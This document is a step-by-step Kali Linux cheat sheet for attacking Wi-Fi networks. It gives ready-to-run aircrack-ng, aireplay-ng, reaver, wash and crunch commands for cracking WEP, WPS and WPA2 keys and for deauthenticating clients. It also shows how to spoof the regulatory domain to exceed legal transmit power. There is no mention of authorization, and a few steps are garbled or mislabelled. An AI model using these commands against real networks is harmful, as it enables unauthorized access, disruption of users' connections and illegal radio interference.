Instructions
=

Wireless Cracking    
*Version 20171003.1*

CONTENTS
=
 - Introduction.
 - Terms
 - Change WiFi adapter output power.
 - Information gathering.
 - WEP cracking.
 - WPS cracking.
 - WPA2 cracking.
 - Deauthorization Attack.
 - Troubleshooting.


Introduction
=
Wireless auditing is fairly easy and straight forward. When put into monitoring mode some wireless adapters enumerate with different names. "wlan0" and "wlan0mon" are common interface names though you may also see "wlan3" or "wlan2mon". The name will be displayed by "airodump-ng" after the command is run.  This guide is written 


**Example**    

   ~# airmon-ng start wlan0
    
    PHY	Interface	Driver		Chipset
     
    phy0	wlan0		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
    
		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
		(mac80211 station mode vif disabled for [phy0]wlan0)    

**Example**


Terms
=

Adapter
BSSID
ESSID
tx
rx
txpower
DBM



Change adapter transmit power
=
 - Logically disconnect the wireless adapter so changes can be made to it's configuration    
>ifconfig wlan0 down

 - Change regulatory cap setting to Guyana where 30DBM is legal    
>iw reg set GY 

 - Change output setting to 30DBM    
>iwconfig wlan0 txpower 30 

 - Logically reconnect the wireless adapter for use    
>ifconfig wlan0 up 





Information gathering
=
 - Make sure all wireless adapters are connected and visible to Kali.
>iwconfig 

 - Kill processes which can interfer with required changes.
>airmon-ng check kill

 - Put your wireless adapter into monitor mode so that it can see all traffic broadcast.
>airmon-ng start wlan0

 - Confirm your adapter is in monitor mode.
>iwconfig 

 - Your wireless adapter should show it is in monitor mode.
 
>wlan0      IEEE 802.11g  ESSID:""  Nickname:""    
>    Mode:Monitor  Frequency:2.452 GHz  Access Point: 00:0F:B5:88:AC:82    

- List wireless networks within rx range. Looks for all wireless encryption types on both 2ghz and 5ghz.
>airodump-ng wlan0mon --band abg

 - Alternatively you can run the following command to get additional information.
>airodump-ng wlan0mon --manufacturer --uptime --wps --encrypt wpa2 --berlin 600 --band abg






WEP cracking
=
 - Make sure all wireless adapters are connected and visible to Kali
>iwconfig 

 - Kill processes which can interfer with required changes
>airmon-ng check kill

 - Put your wireless adapter into monitor mode so that it can see all traffic broadcast
>airmon-ng start wlan0

 - List wireless networks within rx range.  Looks for all wireless encryption types on both 2ghz and 5ghz.
>airodump-ng wlan0mon --encrypt wep --band abg

 - Allow the list to accumulate a names for 2-5 minutes. Then stop the scan.
>CTRL+C

 - Identify the access point you wish to attack. Copy it's channel, and MAC address into following command. Also create a name for the log file.
>airodump-ng -c <channel> -w <logname> --bssid <mac address> wlan0mon

 - Allow the previous command to run and open a new terminal window. -1 means fake authentication. 0 means reassociation timing in seconds. -a <mac address> is the access point MAC address. wlan0mon is the wireless interface name.
>aireplay-ng -1 0 -a <mac address> wlan0mon

 - Wait for "Association successful" message. Open a new terminal window. -3 means arp request replay. -b <mac address> is the access point MAC address. wlan0mon is the wireless interface name.
>aireplay-ng -3 -b <mac address> wlan0mon

 - Allow the previous command to run and open a new terminal window. <logname.cap> is the file created above. 
>aircrack-ng <logname.cap>




WPS cracking
=
 - Make sure all wireless adapters are connected and visible to Kali
>iwconfig 

 - Kill processes which can interfer with required changes
>airmon-ng check kill

 - Put your wireless adapter into monitor mode so that it can see all traffic broadcast
>airmon-ng start wlan0

 - List wireless networks using WPS within rx range.  Looks for all wireless encryption types on both 2ghz and 5ghz. -5 adds 5Ghz channels to the scan. -s -C
>wash -i wlan0mon -s -C -5

 - Allow the list to accumulate a names for 2-5 minutes. Then stop the scan.
>CTRL + C

 - Open a second terminal so you can still see the first window. 
>reaver -i wlan0mon -c <channel> -b <mac address> -vv -N -L 

 - If the previous command stops being effective after a few minutes try the following command instead.
>reaver -i wlan0mon -c <channel> -b <mac address> -vv -N -L --fail-wait=360

 - Once the WPS key is found new passwords can be cracked much more quickly
>reaver -i (monitor interface) -b (BSSID) -c (channel) --pin=(8 digit pin) -vv

**Example**
>reaver -i wlan0mon -c 2 -b C8:D7:19:0D:E3:F7 -vv -S -N -L -d 15 -r 3:15 -T .5 -x 360




WPA2 cracking
=
 - Make sure all wireless adapters are connected and visible to Kali.
>iwconfig 

 - Kill processes which can interfer with required changes.
>airmon-ng check kill

 - Put your wireless adapter into monitor mode so that it can see all traffic broadcast.
>airmon-ng start wlan0

 - List wireless networks within rx range. --band abg means scan both 2.4Ghz and 5Ghz space.
>airodump-ng wlan0mon --band abg 

 - Allow the list to accumulate a names for 2-5 minutes. Then stop the scan.
> CTRL+C

 - Identify the access point you wish to attack. Copy it's channel, and MAC address into following command. Also create a name for the log file. 
>airodump-ng -c <channel> -w <logname> --bssid <mac address> wlan0mon 
 - Wait for "Association successful" message. Open a second terminal so you can still see the first window and run the following command. 
>aireplay-ng -0 0 -a <mac address> wlan0mon

 - 
>crunch <min key length> <max key length> abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%&* | aircrack-ng -b <mac address> -w - <log.cap>








Deauthorization attack
=
iwconfig 
*make sure all wireless adapters are connected.
airmon-ng wlan0mon
*Look at all available APs.
airmon-ng --bssid <mac address> -c <channel> wlan0mon
*Select the AP you'd like to target by mac address and set the wireless card to the correct channel.
aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
*Send deauth packets as fast as possible.

-0 means deauthentication
1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously
-a 00:14:6C:7E:40:80 is the MAC address of the access point
-c 00:0F:B5:34:30:30 is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated
ath0 is the interface name








Troubleshooting
For anyone getting the following error in Kali Linux 2.0:
[X] ERROR: Failed to open ‘wlan0mon’ for capturing
try this as a solution:

1. Put the device in Monitor mode Airmon-ng start wlan0
2. A monitoring interface will be started on wlan0mon
3. Use iwconfig to check if the interface MODE is in managed mode, if so then change it to monitor instead of managed with the following commands:
ifconfig wlan0mon down
iwconfig wlan0mon mode monitor
ifconfig wlan0mon up
4. iwconfig check if the mode is monitoring mode now


